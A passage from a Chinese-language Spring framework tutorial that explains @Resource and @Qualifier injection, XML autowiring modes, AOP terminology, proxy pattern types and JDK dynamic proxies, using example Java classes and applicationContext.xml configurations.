<p>其作用与 Autowired 一样。其区别在于 @Autowired 默认按照 Bean 类型装配，而 @Resource 默认按照 Bean 实例名称进行装配。</p>
<p>@Resource 中有两个重要属性：name 和 type。</p>
<p>Spring 将 name 属性解析为 Bean 实例名称，type 属性解析为 Bean 实例类型。如果指定 name 属性，则按实例名称进行装配；如果指定 type 属性，则按 Bean 类型进行装配。</p>
<p>如果都不指定，则先按 Bean 实例名称装配，如果不能匹配，则再按照 Bean 类型进行装配；如果都无法匹配，则抛出 <code>NoSuchBeanDefinitionException</code> 异常。</p>
<p>7）@Qualifier</p>
<p>与 @Autowired 注解配合使用，会将默认的按 Bean 类型装配修改为按 Bean 的实例名称装配，Bean 的实例名称由 @Qualifier 注解的参数指定。</p>
<h2 id="示例："><a href="#示例：" class="headerlink" title="示例："></a>示例：</h2><p>1）创建 DAO 层接口</p>
<p>在 src 目录下创建一个名为 com.mengma.annotation 的包，在该包下创建一个名为 PersonDao 的接口，并添加一个 add() 方法，如下所示。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.mengma.annotation;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">PersonDao</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>2）创建 DAO 层接口的实现类</p>
<p>在 com.mengma.annotation 包下创建 PersonDao 接口的实现类 PersonDaoImpl，编辑后如下所示。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.mengma.annotation;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Repository;</span><br><span class="line"><span class="meta">@Repository</span>(<span class="string">"personDao"</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PersonDaoImpl</span> <span class="keyword">implements</span> <span class="title">PersonDao</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"Dao层的add()方法执行了..."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上述代码中，首先使用 @Repository 注解将 PersonDaoImpl 类标识为 Spring 中的 Bean，其写法相当于配置文件中 &lt;bean id=”personDao”class=”com.mengma.annotation.PersonDaoImpl”/&gt; 的书写。然后在 add() 方法中输出一句话，用于验证是否成功调用了该方法。</p>
<p>3）创建 Service 层接口</p>
<p>在 com.mengma.annotation 包下创建一个名为 PersonService 的接口，并添加一个 add() 方法，如下所示。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.mengma.annotation;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">PersonService</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>4）创建 Service 层接口的实现类</p>
<p>在 com.mengma.annotation 包下创建 PersonService 接口的实现类 PersonServiceImpl，编辑后如下所示。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.mengma.annotation;</span><br><span class="line"><span class="keyword">import</span> javax.annotation.Resource;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Service;</span><br><span class="line"><span class="meta">@Service</span>(<span class="string">"personService"</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PersonServiceImpl</span> <span class="keyword">implements</span> <span class="title">PersonService</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Resource</span>(name = <span class="string">"personDao"</span>)</span><br><span class="line">    <span class="keyword">private</span> PersonDao personDao;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> PersonDao <span class="title">getPersonDao</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> personDao;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        personDao.add();<span class="comment">// 调用personDao中的add()方法</span></span><br><span class="line">        System.out.println(<span class="string">"Service层的add()方法执行了..."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上述代码中，首先使用 @Service 注解将 PersonServiceImpl 类标识为 Spring 中的 Bean，其写法相当于配置文件中 &lt;bean id=”personService”class=”com.mengma.annotation.PersonServiceImpl”/&gt; 的书写。</p>
<p>然后使用 @Resource 注解标注在属性 personDao 上（也可标注在 personDao 的 setPersonDao() 方法上），这相当于配置文件中 &lt;property name=”personDao”ref=”personDao”/&gt; 的写法。最后在该类的 add() 方法中调用 personDao 中的 add() 方法，并输出一句话。</p>
<p>5）创建 Action</p>
<p>在 com.mengma.annotation 包下创建一个名为 PersonAction 的类，编辑后如下所示。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.mengma.annotation;</span><br><span class="line"><span class="keyword">import</span> javax.annotation.Resource;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="meta">@Controller</span>(<span class="string">"personAction"</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PersonAction</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Resource</span>(name = <span class="string">"personService"</span>)</span><br><span class="line">    <span class="keyword">private</span> PersonService personService;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> PersonService <span class="title">getPersonService</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> personService;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        personService.add(); <span class="comment">// 调用personService中的add()方法</span></span><br><span class="line">        System.out.println(<span class="string">"Action层的add()方法执行了..."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上述代码中，首先使用 @Controller 注解标注 PersonAction 类，其写法相当于在配置文件中编写 &lt;bean id=”personAction”class=”com.mengma.annotation.PersonAction”/&gt;。</p>
<p>然后使用了 @Resource 注解标注在 personService 上，这相当于在配置文件内编写 &lt;property name=”personService”ref=”personService”/&gt;。</p>
<p>最后在其 add() 方法中调用了 personService 中的 add() 方法，并输出一句话。</p>
<p>6）创建 Spring 配置文件</p>
<p>在 com.mengma.annotation 包下创建一个名为 applicationContext.xml 的配置文件，如下所示。</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">"http://www.springframework.org/schema/beans"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:aop</span>=<span class="string">"http://www.springframework.org/schema/aop"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:p</span>=<span class="string">"http://www.springframework.org/schema/p"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:tx</span>=<span class="string">"http://www.springframework.org/schema/tx"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:context</span>=<span class="string">"http://www.springframework.org/schema/context"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xsi:schemaLocation</span>=<span class="string">"</span></span></span><br><span class="line"><span class="tag"><span class="string">            http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="tag"><span class="string">            http://www.springframework.org/schema/beans/spring-beans-2.5.xsd</span></span></span><br><span class="line"><span class="tag"><span class="string">            http://www.springframework.org/schema/aop</span></span></span><br><span class="line"><span class="tag"><span class="string">            http://www.springframework.org/schema/aop/spring-aop-2.5.xsd</span></span></span><br><span class="line"><span class="tag"><span class="string">            http://www.springframework.org/schema/tx</span></span></span><br><span class="line"><span class="tag"><span class="string">            http://www.springframework.org/schema/tx/spring-tx-2.5.xsd</span></span></span><br><span class="line"><span class="tag"><span class="string">            http://www.springframework.org/schema/context</span></span></span><br><span class="line"><span class="tag"><span class="string">            http://www.springframework.org/schema/context/spring-context.xsd"</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--使用context命名空间，通知spring扫描指定目录，进行注解的解析--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">context:component-scan</span> <span class="attr">base-package</span>=<span class="string">"com.mengma.annotation"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>与之前的配置文件相比，上述代码的<beans>元素中增加了第 7 行、第 15 行和第 16 行中包含有 context 的代码，然后在第 18 行代码中，使用 context 命名空间的 component-scan 元素进行注解的扫描，其 base-package 属性用于通知 spring 所需要扫描的目录。</beans></p>
<p>7）创建测试类</p>
<p>在 com.mengma.annotation 包下创建一个名为 AnnotationTest 的测试类，编辑后如下所示。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.mengma.annotation;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.context.ApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.support.ClassPathXmlApplicationContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AnnotationTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        String xmlPath = <span class="string">"com\\mengma\\annotation\\applicationContext.xml"</span>;</span><br><span class="line">        ApplicationContext applicationContext = <span class="keyword">new</span> ClassPathXmlApplicationContext(xmlPath);</span><br><span class="line">        PersonAction personAction = (PersonAction) applicationContext.getBean(<span class="string">"personAction"</span>);</span><br><span class="line">        personAction.add();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>8）运行并查看结果</p>
<p><img data-src="https://i.loli.net/2021/01/23/z7gUoT9aOPwuEJy.png" alt="image-20210104142414391"></p>
<h1 id="ⅩⅢ、Spring自动装配Bean"><a href="#ⅩⅢ、Spring自动装配Bean" class="headerlink" title="ⅩⅢ、Spring自动装配Bean"></a>ⅩⅢ、Spring自动装配Bean</h1><p>除了使用 XML（配置文件） 和 Annotation（注解@） 的方式装配 Bean 以外，还有一种常用的装配方式——自动装配。自动装配就是指 Spring 容器可以自动装配（autowire）相互协作的 Bean 之间的关联关系，将一个 Bean 注入其他 Bean 的 Property 中。</p>
<p>要使用自动装配，就需要配置 <bean> 元素的 autowire 属性。autowire 属性有五个值，具体说明如表所示。</bean></p>
<table>
<thead>
<tr>
<th>名称</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>byName</td>
<td>根据 Property 的 name 自动装配，如果一个 Bean 的 name 和另一个 Bean 中的 Property 的 name 相同，则自动装配这个 Bean 到 Property 中。</td>
</tr>
<tr>
<td>byType</td>
<td>根据 Property 的数据类型（Type）自动装配，如果一个 Bean 的数据类型兼容另一个 Bean 中 Property 的数据类型，则自动装配。</td>
</tr>
<tr>
<td>constructor</td>
<td>根据构造方法的参数的数据类型，进行 byType 模式的自动装配。</td>
</tr>
<tr>
<td>autodetect</td>
<td>如果发现默认的构造方法，则用 constructor 模式，否则用 byType 模式。</td>
</tr>
<tr>
<td>no</td>
<td>默认情况下，不使用自动装配，Bean 依赖必须通过 ref 元素定义。</td>
</tr>
</tbody></table>
<h2 id="实例："><a href="#实例：" class="headerlink" title="实例："></a>实例：</h2><p>在创建了相应的类并且创建相应的 setter 方法过后，如果要使用 Spring 的自动装配，只需要改动配置文件（<strong>删除注解</strong>），以 com.mengma.annotation 项目为例，将 applicationContext.xml修改为：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">"http://www.springframework.org/schema/beans"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:context</span>=<span class="string">"http://www.springframework.org/schema/context"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://www.springframework.org/schema/beans 			http://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/context https://www.springframework.org/schema/context/spring-context.xsd"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span> = <span class="string">"personDao"</span> <span class="attr">class</span> = <span class="string">"com.mengma.annotation.PersonDaoImpl"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span> = <span class="string">"personService"</span> <span class="attr">class</span> = <span class="string">"com.mengma.annotation.PersonServiceImpl"</span> <span class="attr">autowire</span> = <span class="string">"byName"</span>/&gt;</span> </span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span> = <span class="string">"personAction"</span> <span class="attr">class</span> = <span class="string">"com.mengma.annotation.PersonAction"</span> <span class="attr">autowire</span> = <span class="string">"byName"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>在上述配置文件中，用于配置 personService 和 personAction 的 <bean> 元素中除了 id 和 class 属性以外，还增加了 autowire 属性，并将其属性值设置为 byName（按属性名称自动装配）。</bean></p>
<p>默认情况下，配置文件中需要通过 ref 装配 Bean，但设置了 autowire=”byName”，Spring 会在配置文件中自动寻找与属性名字 personDao 相同的 <bean>，找到后，通过调用 setPersonDao（PersonDao personDao）方法将 id 为 personDao 的 Bean 注入 id 为 personService 的 Bean 中，这时就不需要通过 ref 装配了。</bean></p>
<p><img data-src="https://i.loli.net/2021/01/23/WvoCSlsLPkMx1mT.png" alt="image-20210104150035218"></p>
<h1 id="ⅩⅣ、Spring-AOP（面向切面编程）是什么？"><a href="#ⅩⅣ、Spring-AOP（面向切面编程）是什么？" class="headerlink" title="ⅩⅣ、Spring AOP（面向切面编程）是什么？"></a>ⅩⅣ、Spring AOP（面向切面编程）是什么？</h1><p>面向切面编程（AOP）和面向对象编程（OOP）类似，也是一种编程模式。Spring AOP 是基于 AOP 编程模式的一个框架，它的使用有效减少了系统间的重复代码，达到了模块间的松耦合目的。</p>
<p>AOP 的全称是“Aspect Oriented Programming”，即面向切面编程，它将业务逻辑的各个部分进行隔离，使开发人员在编写业务逻辑时可以专心于核心业务，从而提高了开发效率。</p>
<p>AOP 采取横向抽取机制，取代了传统纵向继承体系的重复性代码，其应用主要体现在事务处理、日志管理、权限控制、异常处理等方面。</p>
<p>目前最流行的 AOP 框架有两个，分别为 Spring AOP 和 AspectJ。</p>
<p>Spring AOP 使用纯 Java 实现，不需要专门的编译过程和类加载器，在运行期间通过代理方式向目标类植入增强的代码。</p>
<p>AspectJ 是一个基于 Java 语言的 AOP 框架，从 Spring 2.0 开始，Spring AOP 引入了对 AspectJ 的支持。AspectJ 扩展了 Java 语言，提供了一个专门的编译器，在编译时提供横向代码的植入。</p>
<p>为了更好地理解 AOP，就需要对 AOP 的相关术语有一些了解，这些专业术语主要包含 Joinpoint、Pointcut、Advice、Target、Weaving、Proxy 和 Aspect，它们的含义如下表所示。</p>
<table>
<thead>
<tr>
<th>名称</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>Joinpoint（连接点）</td>
<td>指那些被拦截到的点，在 Spring 中，可以被动态代理拦截目标类的方法。</td>
</tr>
<tr>
<td>Pointcut（切入点）</td>
<td>指要对哪些 Joinpoint 进行拦截，即被拦截的连接点。</td>
</tr>
<tr>
<td>Advice（通知）</td>
<td>指拦截到 Joinpoint 之后要做的事情，即对切入点增强的内容。</td>
</tr>
<tr>
<td>Target（目标）</td>
<td>指代理的目标对象。</td>
</tr>
<tr>
<td>Weaving（植入）</td>
<td>指把增强代码应用到目标上，生成代理对象的过程。</td>
</tr>
<tr>
<td>Proxy（代理）</td>
<td>指生成的代理对象。</td>
</tr>
<tr>
<td>Aspect（切面）</td>
<td>切入点和通知的结合。</td>
</tr>
</tbody></table>
<h1 id="ⅩⅤ、代理模式"><a href="#ⅩⅤ、代理模式" class="headerlink" title="ⅩⅤ、代理模式"></a>ⅩⅤ、代理模式</h1><h2 id="1、概念"><a href="#1、概念" class="headerlink" title="1、概念"></a>1、概念</h2><p>为其他对象提供一种代理以控制对这个对象的访问。在某些情况下，一个对象不想或者不能直接引用另外一个对象，而代理对象可以在客户端和目标对象之间起到中介的作用。</p>
<h2 id="2、代理模式"><a href="#2、代理模式" class="headerlink" title="2、代理模式"></a>2、代理模式</h2><p><strong>1）远程代理（Remote  Proxy）</strong></p>
<p>  为一个位于不同的地址空间的对象提供一个本地的代理对象。这个不同的地址空间可以是在同一台主机中，也可是在另一台主机中。也即为不同地址空间提供局部的代表。</p>
<p><strong>2）虚拟代理（Virtual Proxy）</strong></p>
<p>  根据需要创建开销很大的对象。如果需要创建一个资源消耗较大的对象，先创建一个消耗相对较小的对象来表示，真实对象只在需要时才会被真正创建。 （将目的对象添加到代理对象的方法中，当方法被调用的时候才会创建目的对象的实例）</p>
<p><strong>3）保护代理（Protection Proxy）</strong></p>
<p>  控制对原始对象的访问。保护代理用于对象应该有不同的访问权限的时候。（添加判断，当条件满足时才会创建目的对象的实例）</p>
<p><strong>4）智能指引（Smart Reference）</strong></p>
<p>取代了简单的指针，它在访问对象时执行一些附加操作。</p>
<p><strong>5）Copy-on-Write代理</strong></p>
<p>它是虚拟代理的一种，把复制（克隆）操作延迟到只有在客户端真正需要时才执行。一般来说，对象的深克隆是一个开销较大的操作，Copy-on-Write代理可以让这个操作延迟，只有对象被用到的时候才被克隆。</p>
<h1 id="ⅩⅥ、Spring-JDK动态代理（附带实例）"><a href="#ⅩⅥ、Spring-JDK动态代理（附带实例）" class="headerlink" title="ⅩⅥ、Spring JDK动态代理（附带实例）"></a>ⅩⅥ、Spring JDK动态代理（附带实例）</h1><p><code>Proxy</code>提供了创建动态代理类和实例的静态方法，它也是由这些方法创建的所有动态代理类的超类。</p>
<p>为某个接口创建代理<code>Foo</code> ： </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">InvocationHandler handler = <span class="keyword">new</span> MyInvocationHandler(...);</span><br><span class="line">   Class&lt;?&gt; proxyClass = Proxy.getProxyClass(Foo<span class="class">.<span class="keyword">class</span>.<span class="title">getClassLoader</span>(), <span class="title">Foo</span>.<span class="title">class</span>)</span>;</span><br><span class="line">   Foo f = (Foo) proxyClass.getConstructor(InvocationHandler<span class="class">.<span class="keyword">class</span>).</span></span><br><span class="line"><span class="class">                   <span class="title">newInstance</span>(<span class="title">handler</span>)</span>;</span><br></pre></td></tr></table></figure>

<p>或更简单地：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Foo f = (Foo) Proxy.newProxyInstance(Foo<span class="class">.<span class="keyword">class</span>.<span class="title">getClassLoader</span>(),</span></span><br><span class="line">                                        new Class&lt;?&gt;[] &#123; Foo.class &#125;,</span><br><span class="line">                                        handler);</span><br></pre></td></tr></table></figure>

<p><strong><em>动态代理类</em></strong> （以下简称为<em>代理类</em>  ）是一个实现在类创建时在运行时指定的接口列表的类，具有如下所述的行为。 <em>代理接口</em>是由代理类实现的接口。  <em>代理实例</em>是代理类的一个实例。 每个代理实例都有一个关联的<em>调用处理程序</em>对象，它实现了接口<code>InvocationHandler</code>  。 通过其代理接口之一的代理实例上的方法调用将被分派到实例调用处理程序的<code>invoke</code>方法，传递代理实例，  <code>java.lang.reflect.Method</code>被调用方法的<code>java.lang.reflect.Method</code>对象以及包含参数的类型<code>Object</code>  Object的数组。 调用处理程序适当地处理编码方法调用，并且返回的结果将作为方法在代理实例上调用的结果返回。 </p>
<p>代理类具有以下属性： </p>
<ul>
<li>代理类是<em>公共的，最终的，而不是抽象的，</em>如果所有代理接口都是公共的。 </li>
<li>如果任何代理接口<em>是非公开的，<em>代理类</em>是非公开的，最终的，而不是抽象的</em> 。 </li>
<li>代理类的不合格名称未指定。  然而，以字符串<code>&quot;$Proxy&quot;</code>开头的类名空间应该保留给代理类。 </li>
<li>一个代理类扩展了<code>java.lang.reflect.Proxy</code> 。 </li>
<li>代理类完全按照相同的顺序实现其创建时指定的接口。 </li>
<li>如果一个代理类实现一个非公共接口，那么它将被定义在与该接口相同的包中。  否则，代理类的包也是未指定的。  请注意，程序包密封不会阻止在运行时在特定程序包中成功定义代理类，并且类也不会由同一类加载器定义，并且与特定签名者具有相同的包。 </li>
<li>由于代理类实现了在其创建时指定的所有接口，  <code>getInterfaces</code>在其<code>类</code>对象上调用<code>getInterfaces</code>将返回一个包含相同列表接口的数组（按其创建时指定的顺序），在其<code>类</code>对象上调用<code>getMethods</code>将返回一个数组的<code>方法</code>对象，其中包括这些接口中的所有方法，并调用<code>getMethod</code>将在代理接口中找到可以预期的方法。 </li>
<li><code>Proxy.isProxyClass</code>方法将返回true，如果它通过代理类  -  由<code>Proxy.getProxyClass</code>返回的类或由<code>Proxy.newProxyInstance</code>返回的对象的类  - 否则为false。 </li>
<li>所述<code>java.security.ProtectionDomain</code>代理类的是相同由引导类装载程序装载系统类，如<code>java.lang.Object</code>  ，因为是由受信任的系统代码生成代理类的代码。  此保护域通常将被授予<code>java.security.AllPermission</code> 。 </li>
<li>每个代理类有一个公共构造一个参数，该接口的实现<code>InvocationHandler</code>  ，设置调用处理程序的代理实例。 而不必使用反射API来访问公共构造函数，也可以通过调用<code>Proxy.newProxyInstance</code>方法来创建代理实例，该方法将调用<code>Proxy.getProxyClass</code>的操作与调用处理程序一起调用构造函数。 </li>
</ul>
<p>代理实例具有以下属性： </p>
<ul>
<li><p>给定代理实例<code>proxy</code>和其代理类<code>Foo</code> ，以下表达式将返回true：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">proxy <span class="keyword">instanceof</span> Foo</span><br></pre></td></tr></table></figure>

<p>并且以下演员操作将会成功（而不是投掷一个<code>ClassCastException</code>  ）：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">(Foo) proxy</span><br></pre></td></tr></table></figure>
</li>
<li><p>每个代理实例都有一个关联的调用处理程序，它被传递给它的构造函数。 静态<code>Proxy.getInvocationHandler</code>方法将返回与作为其参数传递的代理实例关联的调用处理程序。 </p>
</li>
<li><p>代理实例上的接口方法调用将被编码并分派到调用处理程序的<code>invoke</code>方法，如该方法的文档所述。 </p>
</li>
<li><p><code>hashCode</code> ，  <code>equals</code>在代理实例上的<code>toString</code>中声明的<code>java.lang.Object</code>或<code>toString</code>或<code>toString</code>或<code>toString</code>方法将被编码并分派到调用处理程序的<code>invoke</code>方法，方法与接口方法调用被编码和调度相同。  传递给<code>invoke</code>的<code>方法</code>对象的声明类将为<code>java.lang.Object</code>  。  从<code>java.lang.Object</code>的代理实例的其他公共方法不会被代理类覆盖，因此这些方法的调用与<code>java.lang.Object</code>  。 </p>
</li>
</ul>
<p>多代理接口中复制的方法 </p>
<p>当代理类的两个或多个接口包含具有相同名称和参数签名的方法时，代理类接口的顺序变得重要。  当在代理实例上调用这种<em>重复方法</em>时，传递给调用处理程序的<code>方法</code>对象不一定是其声明类可以通过调用代理方法的接口的引用类型进行分配的对象。  存在此限制，因为生成的代理类中的相应方法实现无法确定其调用的接口。  因此，当在代理实例上调用重复的方法时，代理类的<code>方法</code>列表中包含方法（直接或通过超级接口继承）的最重要的接口中的方法的Method对象被传递给调用处理程序的<code>invoke</code>方法，而不管方法调用发生的引用类型。 </p>
<p>如果代理接口包含具有相同的名称和参数签名的方法<code>hashCode</code> ， <code>equals</code>  ，或<code>toString</code>的方法<code>java.lang.Object</code> ，当这种方法在代理实例调用时，  <code>方法</code>传递到调用处理程序对象将有<code>java.lang.Object</code>为申报班 换句话说，  <code>java.lang.Object</code>的公共非最终方法<code>java.lang.Object</code>上先于所有代理接口，以确定哪个<code>方法</code>对象传递给调用处理程序。 </p>
<p>还要注意，当将一个重复的方法分派到调用处理程序时，  <code>invoke</code>方法可能只会将可分配给<em>所有</em>可以调用的<em>所有</em>代理接口中的方法的<code>throws</code>子句中的一种异常类型的检查异常类型抛出通过。  如果<code>invoke</code>方法抛出经过检查的异常是不能分配给任何通过它可以通过调用代理接口中的方法声明的异常类型，那么选中<code>UndeclaredThrowableException</code>将通过代理实例调用抛出。  此限制意味着，并非所有通过调用返回的异常类型<code>getExceptionTypes</code>上<code>方法</code>传递给对象<code>invoke</code>方法一定可以成功地抛出<code>invoke</code>方法。 </p>
<h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><p>1）创建项目</p>
<p>2）创建接口 CustomerDao </p>
<p>在项目的 src 目录下创建一个名为 com.mengma.dao 的包，在该包下创建一个 CustomerDao 接口，编辑后如下所示。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.mengma.dao;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">CustomerDao</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">()</span></span>; <span class="comment">// 添加</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">update</span><span class="params">()</span></span>; <span class="comment">// 修改</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">delete</span><span class="params">()</span></span>; <span class="comment">// 删除</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">find</span><span class="params">()</span></span>; <span class="comment">// 查询</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>3）创建实现类 CustomerDaoImpl </p>
<p>在 com.mengma.dao 包下创建 CustomerDao 接口的实现类 CustomerDaoImpl，并实现该接口中的所有方法，如下所示。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.mengma.dao;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CustomerDaoImpl</span> <span class="keyword">implements</span> <span class="title">CustomerDao</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"添加客户..."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">update</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"修改客户..."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">delete</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"删除客户..."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">find</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"修改客户..."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>4）创建切面类 MyAspect</p>
<p>在 src 目录下，创建一个名为 com.mengma.jdk 的包，在该包下创建一个切面类 MyAspect，编辑后如下所示。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.mengma.jdk;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyAspect</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">myBefore</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"强化方法执行之前......"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">myAfter</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"强化方法执行之后......"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上述代码中，在切面中定义了两个增强的方法，分别为 myBefore() 方法和 myAfter() 方法，用于对目标类（CustomerDaoImpl）进行增强。</p>
<p>5）创建代理类 MyBeanFactory </p>
<p>在 com.mengma.jdk 包下创建一个名为 MyBeanFactory 的类，在该类中使用 java.lang.reflect.Proxy 实现 JDK 动态代理，如下所示。</p>
